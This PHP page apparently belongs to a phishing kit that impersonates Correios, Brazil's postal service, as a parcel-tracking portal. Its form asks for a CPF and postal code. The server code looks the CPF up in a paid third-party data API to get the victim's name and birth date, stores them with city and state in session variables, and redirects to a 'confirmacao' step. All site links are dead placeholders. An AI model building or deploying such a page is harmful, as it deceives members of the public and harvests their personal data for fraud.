<?php

define('TOKEN_API_CPF', $token_api_cpf);

function api_cpf($cpf)
{
    $ch = curl_init('https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf=' . $cpf . '&token=' . TOKEN_API_CPF);

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT        => 20,
    ]);

    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

function validarCEP(string $cep): bool
{
    $cep = preg_replace('/\D/', '', $cep);
    return strlen($cep) === 8;
}

function buscarCidadePorCEP(string $cep)
{
    $cep = preg_replace('/\D/', '', $cep);
    if (strlen($cep) !== 8) {
        return "Erro ao obter cidade";
    }
    $url = "https://viacep.com.br/ws/{$cep}/json/";
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_CONNECTTIMEOUT => 5,
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    if ($response === false || $curlError || $httpCode !== 200) {
        return "Erro ao obter cidade";
    }
    $data = json_decode($response, true);
    if (!$data || isset($data['erro'])) {
        return "Erro ao obter cidade";
    }

    return $data;
}

$mensagem_erro = "";

if (isset($_POST['consultar_cpf'])) {
    $sucesso_post_cpf = true;
    $sucesso_post_cep = true;
    if (isset($_POST['user_cpf']) && isset($_POST['user_cep']) && $_POST['user_cpf'] != '' && $_POST['user_cpf'] != '') {
        $user_cpf = $_POST['user_cpf'];
        if (validaCPF($user_cpf)) {
            $dados_api = api_cpf($user_cpf);
            if (isset($dados_api['result']['nome_da_pf']) && $dados_api['result']['nome_da_pf'] != '') {
                $result_nome = $dados_api['result']['nome_da_pf'];
                $result_nascimento = $dados_api['result']['data_nascimento'];
                $result_sexo = "";
                // $result_cpf = $dados_api['result']['numero_de_cpf'];

                $_SESSION['OFRT_C_nome'] = $result_nome;
                $_SESSION['OFRT_C_nascimento'] = $result_nascimento;
                $_SESSION['OFRT_C_sexo'] = $result_sexo;
                $_SESSION['OFRT_C_cpf'] = $user_cpf;
            } else {
                $sucesso_post_cpf = false;
            }
        } else {
            $sucesso_post_cpf = false;
        }

        $user_cep = $_POST['user_cep'];
        if (validarCEP($user_cep)) {
            $cep_dados = buscarCidadePorCEP($user_cep);
            if ($cep_dados == "Erro ao obter cidade") {
                $_SESSION['OFRT_C_cidade'] = "Erro ao obter cidade";
                $_SESSION['OFRT_C_estado'] = "Erro ao obter estado";
            } else {
                $_SESSION['OFRT_C_cidade'] = $cep_dados['localidade'];
                $_SESSION['OFRT_C_estado'] = $cep_dados['estado'];
            }
        } else {
            $sucesso_post_cep = false;
        }
    }

    if ($sucesso_post_cpf && $sucesso_post_cep) {
        redirecionar(LINK_DOMINIO . 'confirmacao');
    } else {
        if ($sucesso_post_cep == false) {
            $mensagem_erro = "CEP inválido!";
        }
        if ($sucesso_post_cpf == false) {
            $mensagem_erro = "CPF inválido!";
        }
    }
}

?>

<header class="w-100 font-size-16 font-weight-400 text-blue">
    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
        <span>Acessibilidade</span>

        <i class="fas fa-caret-down ml-1"></i>
    </div>
    <div class="">
        <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
            style="height:48px">
            <div class="menu-toggle" id="menu-toggle" style="width:50px">
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
            </div>

            <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
                <a href="#" class="py-2">
                    <img src="<?php echo FILES ?>images/correios.png" alt="" height="25">
                </a>
            </div>

            <div class="ml-4 d-none d-lg-block " style="width:150px">
                <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
                    <img src="<?php echo FILES ?>images/entrar.svg" alt="Correios" width="31" style="display: none;">

                    <span class="ml-1">Entrar</span>
                </a>
            </div>
        </nav>
    </div>
</header>

<main>
    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
        <span class="text-blue mr-2">Portal Correios</span>
        <i class="fal fa-angle-right mr-2"></i>
        <span class="text-blue mr-2">Rastreamento</span>
        <i class="fal fa-angle-right mr-2"></i>

    </nav>

    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between"
        style="margin:0 auto;">
        Rastreamento

    </h1>

    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">

        <h5 style="color: #003157; margin-bottom:0 !important;" class=" text-center font-weight-700 mb-4">
            <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO


        </h5>

        <style>
        #msg_erro {
            text-align: center;
            color: red;
            padding-bottom: 0px;
            margin-bottom: 0;
            display: none;
        }

        #msg_erro.active {
            display: block;
        }
        </style>

        <form method="post">
            <p id="msg_erro" class="<?php echo $mensagem_erro != "" ? "active" : ""; ?>"><?php echo $mensagem_erro; ?>
            </p><br>
            <span>Digite o seu CPF.</span>

            <input type="hidden" autocomplete="off">
            <div class="form-group mt-1">
                <input type="text" name="user_cpf" class="form-control mask_cpf" placeholder="000.000.000-00"
                    maxlength="14" required="">


            </div>
            <span>Informe o seu CEP abaixo.</span>
            <div class="form-group mt-1">
                <input type="text" name="user_cep" class="form-control mask_cep" placeholder="00000-000" maxlength="9"
                    required="">
            </div>

            <div class="form-group mt-1 d-flex justify-content-center">
                <button type="submit" name="consultar_cpf" class="btn btn-primary">Consultar</button>
            </div>
        </form>
    </section>


    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
        <div>
            <img src="https://i.ibb.co/5W3mjyrW/banner-1.jpg" alt="" class="w-100">
        </div>
    </section>
</main>

<footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Fale Conosco</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="fas fa-desktop"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Registro de Manifestações</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-question-square mr-1"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Central de Atendimento</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-briefcase"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Solucões para o seu negócio</span>
                </a>
            </li>
            <li class="mb-2 font-size-14">
                <i class="far fa-headset"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Suporte ao cliente com contrato</span>
                </a>
            </li>
            <li class="mb-2 font-size-14">
                <i class="far fa-comment-alt-dots"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Ouvidoria</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-user-headset"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Denúncia</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="far fa-address-card"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Identidade colaborativa</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-user-graduate"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Educação e cultura</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-book-alt"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span>Código de ética</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-search"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Transparência e prestação de contas</span>
                </a>
            </li>

            <li class="mb-2 font-size-14">
                <i class="far fa-comment-alt-dots"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Política de privacidade e Notas legais</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
        <h5 class="font-weight-700 mb-4">Outros Sites</h5>

        <ul>
            <li class="mb-2 font-size-14">
                <i class="far fa-shopping-cart"></i>
                <a href="#" class="ml-2 text-blue-dark text-hover-orange">
                    <span class="text-wrap">Loja online dos correios</span>
                </a>
            </li>
        </ul>
    </div>

    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
        <span>© Copyright 2026 Correios</span>
    </div>
</footer>
<?php arquivo('imask.js') ?>
<?php arquivo('mascaras.js') ?>